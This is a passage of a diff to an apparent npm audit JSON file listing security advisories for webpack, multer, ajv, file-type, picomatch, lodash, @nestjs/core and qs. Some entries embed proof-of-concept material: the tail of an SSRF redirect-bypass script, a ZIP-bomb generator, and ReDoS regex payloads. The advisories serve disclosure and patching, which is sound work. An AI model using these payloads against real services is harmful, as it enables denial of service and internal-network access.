(!secret) {\n        console.log(\"\\n[SECURITY SUMMARY]\");\n        console.log(`- bundle contains internal secret marker: ${fmtBool(false)}`);\n        return;\n      }\n\n      const lockHit = await fileContains(lockfile, secret);\n\n      let cacheFiles = [];\n      try { cacheFiles = await walk(cacheDir); } catch { cacheFiles = []; }\n      const cacheHit = cacheFiles.length ? (await findInFiles(cacheFiles, secret)).length > 0 : false;\n\n      const allTmpFiles = await walk(tmp);\n      const allHits = await findInFiles(allTmpFiles, secret);\n\n      console.log(`\\n- extracted secret marker from bundle: ${secret}`);\n\n      console.log(\"\\n[SECURITY SUMMARY]\");\n      console.log(`- Redirect allow-list bypass: ${fmtBool(true)} (imported allowed URL, but internal target was fetched)`);\n      console.log(`- Internal target (SSRF-like): ${internalTarget}`);\n      console.log(`- EXPECTED: internal target should be BLOCKED by allowedUris`);\n      console.log(`- ACTUAL: internal content treated as module and bundled`);\n\n      console.log(\"\\n[EVIDENCE CHECKLIST]\");\n      console.log(`- bundle contains secret:   ${fmtBool(true)}`);\n      console.log(`- cache contains secret:    ${fmtBool(cacheHit)}`);\n      console.log(`- lockfile contains secret: ${fmtBool(lockHit)}`);\n\n      console.log(\"\\n[PERSISTENCE CHECK] files containing secret\");\n      for (const f of allHits.slice(0, 30)) console.log(`- ${f}`);\n      if (allHits.length > 30) console.log(`- ... and ${allHits.length - 30} more`);\n    } catch (e) {\n      console.error(e);\n      process.exitCode = 1;\n    } finally {\n      compiler.close(() => {});\n    }\n  });\n})();\n```\n\n#### 4) Run\nTerminal A:\n```bash\nnode server.js\n```\n\nTerminal B:\n```bash\nnode attacker.js\n```\n\n#### 5) Expected\n\nExpected: Redirect target should be rejected if not in allowedUris (only http://127.0.0.1:9000/ is allowed).\n\n### Impact\n\nVulnerability class: Policy/allow-list bypass leading to SSRF behavior at build time and untrusted content inclusion in build outputs (and potentially bundling of attacker-controlled JavaScript if the redirect target is attacker-controlled).\n\nWho is impacted: Projects that enable experiments.buildHttp and rely on allowedUris as a security boundary (to restrict remote module fetching). In such environments, an attacker who can influence imported URLs (e.g., via source contribution, dependency manipulation, or configuration) and can cause an allowed endpoint to redirect can:\n\ntrigger network requests from the build machine to internal-only services (SSRF behavior),\n\ncause content from outside the allow-list to be bundled into build outputs,\n\nand cause fetched responses to persist in build artifacts (e.g., buildHttp cache), increasing the risk of later exfiltration.",
+      "reported_by": null,
+      "title": "webpack buildHttp HttpUriPlugin allowedUris bypass via HTTP redirects ÔåÆ SSRF + cache persistence",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-68157"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "webpack",
+      "vulnerable_versions": ">=5.49.0 <5.104.0",
+      "github_advisory_id": "GHSA-38r7-794h-5758",
+      "recommendation": "Upgrade to version 5.104.0 or later",
+      "patched_versions": ">=5.104.0",
+      "updated": "2026-02-06T14:39:27.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-38r7-794h-5758"
+    },
+    "1113635": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-xf7r-hgr6-v32p\n- https://nvd.nist.gov/vuln/detail/CVE-2026-3304\n- https://github.com/expressjs/multer/commit/739919097dde3921ec31b930e4b9025036fa74ee\n- https://cna.openjsf.org/security-advisories.html\n- https://www.cve.org/CVERecord?id=CVE-2026-3304\n- https://github.com/advisories/GHSA-xf7r-hgr6-v32p",
+      "created": "2026-03-01T01:18:50.000Z",
+      "id": 1113635,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in Multer versions < 2.1.0 allows an attacker to trigger a Denial of Service (DoS) by sending malformed requests, potentially causing resource exhaustion.\n\n### Patches\n\nUsers should upgrade to `2.1.0`\n\n### Workarounds\n\nNone",
+      "reported_by": null,
+      "title": "Multer vulnerable to Denial of Service via incomplete cleanup",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-3304"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.1.0",
+      "github_advisory_id": "GHSA-xf7r-hgr6-v32p",
+      "recommendation": "Upgrade to version 2.1.0 or later",
+      "patched_versions": ">=2.1.0",
+      "updated": "2026-03-01T01:18:51.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-459"
+      ],
+      "url": "https://github.com/advisories/GHSA-xf7r-hgr6-v32p"
+    },
+    "1113636": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-v52c-386h-88mc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-2359\n- https://github.com/expressjs/multer/commit/cccf0fe0e64150c4f42ccf6654165c0d66b9adab\n- https://cna.openjsf.org/security-advisories.html\n- https://www.cve.org/CVERecord?id=CVE-2026-2359\n- https://github.com/advisories/GHSA-v52c-386h-88mc",
+      "created": "2026-03-01T01:18:27.000Z",
+      "id": 1113636,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in Multer versions < 2.1.0 allows an attacker to trigger a Denial of Service (DoS) by dropping connection during file upload, potentially causing resource exhaustion.\n\n### Patches\n\nUsers should upgrade to `2.1.0`\n\n### Workarounds\n\nNone",
+      "reported_by": null,
+      "title": "Multer vulnerable to Denial of Service via resource exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-2359"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.1.0",
+      "github_advisory_id": "GHSA-v52c-386h-88mc",
+      "recommendation": "Upgrade to version 2.1.0 or later",
+      "patched_versions": ">=2.1.0",
+      "updated": "2026-03-01T01:19:07.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-772"
+      ],
+      "url": "https://github.com/advisories/GHSA-v52c-386h-88mc"
+    },
+    "1113715": {
+      "findings": [
+        {
+          "version": "8.12.0",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-69873\n- https://github.com/EthanKim88/ethan-cve-disclosures/blob/main/CVE-2025-69873-ajv-ReDoS.md\n- https://github.com/ajv-validator/ajv/pull/2586\n- https://github.com/ajv-validator/ajv/commit/720a23fa453ffae8340e92c9b0fe886c54cfe0d5\n- https://github.com/ajv-validator/ajv/releases/tag/v8.18.0\n- https://github.com/ajv-validator/ajv/pull/2588\n- https://github.com/ajv-validator/ajv/releases/tag/v6.14.0\n- https://github.com/advisories/GHSA-2g4f-4pwh-qvx6\n- https://github.com/ajv-validator/ajv/pull/2590\n- https://github.com/github/advisory-database/pull/6991",
+      "created": "2026-02-11T21:30:39.000Z",
+      "id": 1113715,
+      "npm_advisory_id": null,
+      "overview": "ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\\\"^(a|a)*$\\\"`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.",
+      "reported_by": null,
+      "title": "ajv has ReDoS when using `$data` option",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-69873"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ajv",
+      "vulnerable_versions": ">=7.0.0-alpha.0 <8.18.0",
+      "github_advisory_id": "GHSA-2g4f-4pwh-qvx6",
+      "recommendation": "Upgrade to version 8.18.0 or later",
+      "patched_versions": ">=8.18.0",
+      "updated": "2026-03-02T21:58:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-2g4f-4pwh-qvx6"
+    },
+    "1113996": {
+      "findings": [
+        {
+          "version": "2.0.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/expressjs/multer/security/advisories/GHSA-5528-5vmv-3xc2\n- https://nvd.nist.gov/vuln/detail/CVE-2026-3520\n- https://github.com/expressjs/multer/commit/7e66481f8b2e6c54b982b34c152479e096ce2752\n- https://cna.openjsf.org/security-advisories.html\n- https://www.cve.org/CVERecord?id=CVE-2026-3520\n- https://github.com/advisories/GHSA-5528-5vmv-3xc2",
+      "created": "2026-03-05T00:27:50.000Z",
+      "id": 1113996,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nA vulnerability in Multer versions < 2.1.1 allows an attacker to trigger a Denial of Service (DoS) by sending malformed requests, potentially causing stack overflow.\n\n### Patches\n\nUsers should upgrade to `2.1.1`\n\n### Workarounds\n\nNone\n\n### Resources\n\n- https://github.com/expressjs/multer/security/advisories/GHSA-5528-5vmv-3xc2\n- https://www.cve.org/CVERecord?id=CVE-2026-3520\n- https://github.com/expressjs/multer/commit/7e66481f8b2e6c54b982b34c152479e096ce2752\n- https://cna.openjsf.org/security-advisories.html",
+      "reported_by": null,
+      "title": "Multer Vulnerable to Denial of Service via Uncontrolled Recursion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-3520"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "multer",
+      "vulnerable_versions": "<2.1.1",
+      "github_advisory_id": "GHSA-5528-5vmv-3xc2",
+      "recommendation": "Upgrade to version 2.1.1 or later",
+      "patched_versions": ">=2.1.1",
+      "updated": "2026-03-05T00:27:52.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-674"
+      ],
+      "url": "https://github.com/advisories/GHSA-5528-5vmv-3xc2"
+    },
+    "1114301": {
+      "findings": [
+        {
+          "version": "20.4.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sindresorhus/file-type/security/advisories/GHSA-5v7r-6r5c-r473\n- https://nvd.nist.gov/vuln/detail/CVE-2026-31808\n- https://github.com/sindresorhus/file-type/commit/319abf871b50ba2fa221b4a7050059f1ae096f4f\n- https://github.com/advisories/GHSA-5v7r-6r5c-r473",
+      "created": "2026-03-10T23:57:09.000Z",
+      "id": 1114301,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nA denial of service vulnerability exists in the ASF (WMV/WMA) file type detection parser. When parsing a crafted input where an ASF sub-header has a `size` field of zero, the parser enters an infinite loop. The `payload` value becomes negative (-24), causing `tokenizer.ignore(payload)` to move the read position backwards, so the same sub-header is read repeatedly forever.\n\nAny application that uses `file-type` to detect the type of untrusted/attacker-controlled input is affected. An attacker can stall the Node.js event loop with a 55-byte payload.\n\n### Patches\nFixed in version 21.3.1. Users should upgrade to >= 21.3.1.\n\n### Workarounds\nValidate or limit the size of input buffers before passing them to `file-type`, or run file type detection in a worker thread with a timeout.\n\n### References\n- Fix commit: 319abf871b50ba2fa221b4a7050059f1ae096f4f\n\n### Reporter\n\ncrnkovic@lokvica.com",
+      "reported_by": null,
+      "title": "file-type affected by infinite loop in ASF parser on malformed input with zero-size sub-header",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-31808"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "file-type",
+      "vulnerable_versions": ">=13.0.0 <21.3.1",
+      "github_advisory_id": "GHSA-5v7r-6r5c-r473",
+      "recommendation": "Upgrade to version 21.3.1 or later",
+      "patched_versions": ">=21.3.1",
+      "updated": "2026-03-10T23:57:11.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-5v7r-6r5c-r473"
+    },
+    "1114726": {
+      "findings": [
+        {
+          "version": "20.4.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sindresorhus/file-type/security/advisories/GHSA-j47w-4g3g-c36v\n- https://github.com/sindresorhus/file-type/commit/a155cd71323279de173c54e8c530d300d3854fdd\n- https://github.com/sindresorhus/file-type/releases/tag/v21.3.2\n- https://nvd.nist.gov/vuln/detail/CVE-2026-32630\n- https://github.com/sindresorhus/file-type/commit/399b0f156063f5aeb1c124a7fd61028f3ea7c124\n- https://github.com/advisories/GHSA-j47w-4g3g-c36v",
+      "created": "2026-03-13T20:56:05.000Z",
+      "id": 1114726,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA crafted ZIP file can trigger excessive memory growth during type detection in `file-type` when using `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()`.\n\nIn affected versions, the ZIP inflate output limit is enforced for stream-based detection, but not for known-size inputs. As a result, a small compressed ZIP can cause `file-type` to inflate and process a much larger payload while probing ZIP-based formats such as OOXML. In testing on `file-type` `21.3.1`, a ZIP of about `255 KB` caused about `257 MB` of RSS growth during `fileTypeFromBuffer()`.\n\nThis is an availability issue. Applications that use these APIs on untrusted uploads can be forced to consume large amounts of memory and may become slow or crash.\n\n## Root Cause\n\nThe ZIP detection logic applied different limits depending on whether the tokenizer had a known file size.\n\nFor stream inputs, ZIP probing was bounded by `maximumZipEntrySizeInBytes` (`1 MiB`). For known-size inputs such as buffers, blobs, and files, the code instead used `Number.MAX_SAFE_INTEGER` in two relevant places:\n\n```js\nconst maximumContentTypesEntrySize = hasUnknownFileSize(tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nand:\n\n```js\nconst maximumLength = hasUnknownFileSize(this.tokenizer)\n\t? maximumZipEntrySizeInBytes\n\t: Number.MAX_SAFE_INTEGER;\n```\n\nTogether, these checks allowed a crafted ZIP to bypass the intended inflate limit for known-size APIs and force large decompression during detection of entries such as `[Content_Types].xml`.\n\n## Proof of Concept\n\n```js\nimport {fileTypeFromBuffer} from 'file-type';\nimport archiver from 'archiver';\nimport {Writable} from 'node:stream';\n\nasync function createZipBomb(sizeInMegabytes) {\n\treturn new Promise((resolve, reject) => {\n\t\tconst chunks = [];\n\t\tconst writable = new Writable({\n\t\t\twrite(chunk, encoding, callback) {\n\t\t\t\tchunks.push(chunk);\n\t\t\t\tcallback();\n\t\t\t},\n\t\t});\n\n\t\tconst archive = archiver('zip', {zlib: {level: 9}});\n\t\tarchive.pipe(writable);\n\t\twritable.on('finish', () => {\n\t\t\tresolve(Buffer.concat(chunks));\n\t\t});\n\t\tarchive.on('error', reject);\n\n\t\tconst xmlPrefix = '<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\">';\n\t\tconst padding = Buffer.alloc(sizeInMegabytes * 1024 * 1024 - xmlPrefix.length, 0x20);\n\t\tarchive.append(Buffer.concat([Buffer.from(xmlPrefix), padding]), {name: '[Content_Types].xml'});\n\t\tarchive.finalize();\n\t});\n}\n\nconst zip = await createZipBomb(256);\nconsole.log('ZIP size (KB):', (zip.length / 1024).toFixed(0));\n\nconst before = process.memoryUsage().rss;\nawait fileTypeFromBuffer(zip);\nconst after = process.memoryUsage().rss;\n\nconsole.log('RSS growth (MB):', ((after - before) / 1024 / 1024).toFixed(0));\n```\n\nObserved on `file-type` `21.3.1`:\n- ZIP size: about `255 KB`\n- RSS growth during detection: about `257 MB`\n\n## Affected APIs\n\nAffected:\n- `fileTypeFromBuffer()`\n- `fileTypeFromBlob()`\n- `fileTypeFromFile()`\n\nNot affected:\n- `fileTypeFromStream()`, which already enforced the ZIP inflate limit for unknown-size inputs\n\n## Impact\n\nApplications that inspect untrusted uploads with `fileTypeFromBuffer()`, `fileTypeFromBlob()`, or `fileTypeFromFile()` can be forced to consume excessive memory during ZIP-based type detection. This can degrade service or lead to process termination in memory-constrained environments.\n\n## Cause\n\nThe issue was introduced in 399b0f1",
+      "reported_by": null,
+      "title": "file-type: ZIP Decompression Bomb DoS via [Content_Types].xml entry",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-32630"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "file-type",
+      "vulnerable_versions": ">=20.0.0 <=21.3.1",
+      "github_advisory_id": "GHSA-j47w-4g3g-c36v",
+      "recommendation": "Upgrade to version 21.3.2 or later",
+      "patched_versions": ">=21.3.2",
+      "updated": "2026-03-16T21:59:51.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-409"
+      ],
+      "url": "https://github.com/advisories/GHSA-j47w-4g3g-c36v"
+    },
+    "1115551": {
+      "findings": [
+        {
+          "version": "4.0.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-3v7f-55p6-f55p\n- https://github.com/micromatch/picomatch/commit/4516eb521f13a46b2fe1a1d2c9ef6b20ddc0e903\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33672\n- https://github.com/advisories/GHSA-3v7f-55p6-f55p",
+      "created": "2026-03-25T21:13:39.000Z",
+      "id": 1115551,
+      "npm_advisory_id": null,
+      "overview": "### Impact\npicomatch is vulnerable to a **method injection vulnerability (CWE-1321)** affecting the `POSIX_REGEX_SOURCE` object. Because the object inherits from `Object.prototype`, specially crafted POSIX bracket expressions (e.g., `[[:constructor:]]`) can reference inherited method names. These methods are implicitly converted to strings and injected into the generated regular expression.\n\nThis leads to **incorrect glob matching behavior (integrity impact)**, where patterns may match unintended filenames. The issue does **not enable remote code execution**, but it can cause security-relevant logic errors in applications that rely on glob matching for filtering, validation, or access control.\n\nAll users of affected `picomatch` versions that process untrusted or user-controlled glob patterns are potentially impacted.\n\n### Patches\n\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\n\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to picomatch.\n\nPossible mitigations include:\n- Sanitizing or rejecting untrusted glob patterns, especially those containing POSIX character classes like `[[:...:]]`.\n- Avoiding the use of POSIX bracket expressions if user input is involved.\n- Manually patching the library by modifying `POSIX_REGEX_SOURCE` to use a null prototype:\n\n  ```js\n  const POSIX_REGEX_SOURCE = {\n    __proto__: null,\n    alnum: 'a-zA-Z0-9',\n    alpha: 'a-zA-Z',\n    // ... rest unchanged\n  };\n  \n### Resources\n\n- fix for similar issue: https://github.com/micromatch/picomatch/pull/144\n- picomatch repository https://github.com/micromatch/picomatch",
+      "reported_by": null,
+      "title": "Picomatch: Method Injection in POSIX Character Classes causes incorrect Glob Matching",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33672"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-3v7f-55p6-f55p",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:25.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-3v7f-55p6-f55p"
+    },
+    "1115554": {
+      "findings": [
+        {
+          "version": "4.0.1",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/micromatch/picomatch/security/advisories/GHSA-c2c7-rcm5-vvqj\n- https://github.com/micromatch/picomatch/commit/5eceecd27543b8e056b9307d69e105ea03618a7d\n- https://nvd.nist.gov/vuln/detail/CVE-2026-33671\n- https://github.com/advisories/GHSA-c2c7-rcm5-vvqj",
+      "created": "2026-03-25T21:12:07.000Z",
+      "id": 1115554,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n`picomatch` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing crafted extglob patterns. Certain patterns using extglob quantifiers such as `+()` and `*()`, especially when combined with overlapping alternatives or nested extglobs, are compiled into regular expressions that can exhibit catastrophic backtracking on non-matching input.\n\nExamples of problematic patterns include `+(a|aa)`, `+(*|?)`, `+(+(a))`, `*(+(a))`, and `+(+(+(a)))`. In local reproduction, these patterns caused multi-second event-loop blocking with relatively short inputs. For example, `+(a|aa)` compiled to `^(?:(?=.)(?:a|aa)+)$` and took about 2 seconds to reject a 41-character non-matching input, while nested patterns such as `+(+(a))` and `*(+(a))` took around 29 seconds to reject a 33-character input on a modern M1 MacBook.\n\nApplications are impacted when they allow untrusted users to supply glob patterns that are passed to `picomatch` for compilation or matching. In those cases, an attacker can cause excessive CPU consumption and block the Node.js event loop, resulting in a denial of service. Applications that only use trusted, developer-controlled glob patterns are much less likely to be exposed in a security-relevant way.\n\n### Patches\nThis issue is fixed in picomatch 4.0.4, 3.0.2 and 2.3.2.\n\nUsers should upgrade to one of these versions or later, depending on their supported release line.\n\n### Workarounds\nIf upgrading is not immediately possible, avoid passing untrusted glob patterns to `picomatch`.\n\nPossible mitigations include:\n- disable extglob support for untrusted patterns by using `noextglob: true`\n- reject or sanitize patterns containing nested extglobs or extglob quantifiers such as `+()` and `*()`\n- enforce strict allowlists for accepted pattern syntax\n- run matching in an isolated worker or separate process with time and resource limits\n- apply application-level request throttling and input validation for any endpoint that accepts glob patterns\n\n### Resources\n- Picomatch repository: https://github.com/micromatch/picomatch\n- `lib/parse.js` and `lib/constants.js` are involved in generating the vulnerable regex forms\n- Comparable ReDoS precedent: CVE-2024-4067 (`micromatch`)\n- Comparable generated-regex precedent: CVE-2024-45296 (`path-to-regexp`)",
+      "reported_by": null,
+      "title": "Picomatch has a ReDoS vulnerability via extglob quantifiers",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-33671"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "picomatch",
+      "vulnerable_versions": ">=4.0.0 <4.0.4",
+      "github_advisory_id": "GHSA-c2c7-rcm5-vvqj",
+      "recommendation": "Upgrade to version 4.0.4 or later",
+      "patched_versions": ">=4.0.4",
+      "updated": "2026-03-27T21:36:14.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-c2c7-rcm5-vvqj"
+    },
+    "1115806": {
+      "findings": [
+        {
+          "version": "4.17.21",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/lodash/lodash/security/advisories/GHSA-r5fr-rjxr-66jc\n- https://nvd.nist.gov/vuln/detail/CVE-2026-4800\n- https://github.com/lodash/lodash/commit/3469357cff396a26c363f8c1b5a91dde28ba4b1c\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/advisories/GHSA-35jh-r3h4-6jhm\n- https://github.com/advisories/GHSA-r5fr-rjxr-66jc",
+      "created": "2026-04-01T23:51:12.000Z",
+      "id": 1115806,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+      "reported_by": null,
+      "title": "lodash vulnerable to Code Injection via `_.template` imports key names",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-4800"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "lodash",
+      "vulnerable_versions": ">=4.0.0 <=4.17.23",
+      "github_advisory_id": "GHSA-r5fr-rjxr-66jc",
+      "recommendation": "Upgrade to version 4.18.0 or later",
+      "patched_versions": ">=4.18.0",
+      "updated": "2026-04-01T23:51:13.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-r5fr-rjxr-66jc"
+    },
+    "1117063": {
+      "findings": [
+        {
+          "version": "10.4.22",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nestjs/nest/security/advisories/GHSA-36xv-jgw5-4q75\n- https://github.com/nestjs/nest/pull/16686\n- https://github.com/nestjs/nest/commit/83558ae774a990a7916141d3abe0b6548ff3a8b2\n- https://github.com/nestjs/nest/releases/tag/v11.1.18\n- https://nvd.nist.gov/vuln/detail/CVE-2026-35515\n- https://github.com/advisories/GHSA-36xv-jgw5-4q75",
+      "created": "2026-04-06T17:59:51.000Z",
+      "id": 1117063,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n[`SseStream._transform()`](https://github.com/nestjs/nest/blob/dea5279ef8fcb568de158003e4281759a2cd7675/packages/core/router/sse-stream.ts) interpolates `message.type` and `message.id` directly into Server-Sent Events text protocol output without sanitizing newline characters (`\\r`, `\\n`). Since the SSE protocol treats both `\\r` and `\\n` as field delimiters and `\\n\\n` as event boundaries, an attacker who can influence these fields through upstream data sources can inject arbitrary SSE events, spoof event types, and corrupt reconnection state. Spring Framework's own security patch ([6e97587](https://github.com/spring-projects/spring-framework/commit/6e9758700a4946be1dca85ca937ef2603e291301)) validates these same fields (`id`, `event`) for the same reason.\n\nActual impact:\n\n- **Event spoofing**: Attacker forges SSE events with arbitrary `event:` types, causing client-side `EventSource.addEventListener()` callbacks to fire for wrong event types.\n- **Data injection**: Attacker injects arbitrary `data:` payloads, potentially triggering XSS if the client renders SSE data as HTML without sanitization.\n- **Reconnection corruption**: Attacker injects `id:` fields, corrupting the `Last-Event-ID` header on reconnection, causing the client to miss or replay events.\n- **Attack precondition**: Requires the developer to map user-influenced data to the `type` or `id` fields of SSE messages. Direct HTTP request input does not reach these fields without developer code bridging the gap.\n-\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nPatched in `@nestjs/core@11.1.18`",
+      "reported_by": null,
+      "title": "@nestjs/core Improperly Neutralizes Special Elements in Output Used by a Downstream Component ('Injection')",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-35515"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@nestjs/core",
+      "vulnerable_versions": "<=11.1.17",
+      "github_advisory_id": "GHSA-36xv-jgw5-4q75",
+      "recommendation": "Upgrade to version 11.1.18 or later",
+      "patched_versions": ">=11.1.18",
+      "updated": "2026-04-24T20:46:24.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-74"
+      ],
+      "url": "https://github.com/advisories/GHSA-36xv-jgw5-4q75"
+    },
+    "1119502": {
+      "findings": [
+        {
+          "version": "6.14.2",
+          "paths": []
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-q8mj-m7cp-5q26\n- https://nvd.nist.gov/vuln/detail/CVE-2026-8723\n- https://github.com/ljharb/qs/commit/21f80b33e5c8b3f7eba1034fff0da4a4a37a1d41\n- https://github.com/advisories/GHSA-q8mj-m7cp-5q26",
+      "created": "2026-05-22T17:27:19.000Z",
+      "id": 1119502,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`qs.stringify` throws `TypeError` when called with `arrayFormat: 'comma'` and `encodeValuesOnly: true` on an array containing `null` or `undefined`. The throw is synchronous and not handled by any of qs's null-related options (`skipNulls`, `strictNullHandling`).\n\n### Details\n\nIn the comma + `encodeValuesOnly` branch, `lib/stringify.js:145` mapped the array through the raw encoder before joining:\n\n```js\nobj = utils.maybeMap(obj, encoder);\n```\n\n`utils.encode` (`lib/utils.js:195`) reads `str.length` with no null guard, so a `null` or `undefined` element throws `TypeError`. `skipNulls` and `strictNullHandling` are both checked in the per-element loop below this line and never get a chance to run.\n\nSame class of bug as the filter-array path fixed in 0c180a4. The vulnerable shape of the comma + `encodeValuesOnly` branch was introduced in 4c4b23d (\"encode comma values more consistently\", PR #463, 2023-01-19), first released in v6.11.1.\n\n#### PoC\n\n```js\nconst qs = require('qs');\n\nqs.stringify({ a: [null, 'b'] },      { arrayFormat: 'comma', encodeValuesOnly: true });\nqs.stringify({ a: [undefined, 'b'] }, { arrayFormat: 'comma', encodeValuesOnly: true });\nqs.stringify({ a: [null] 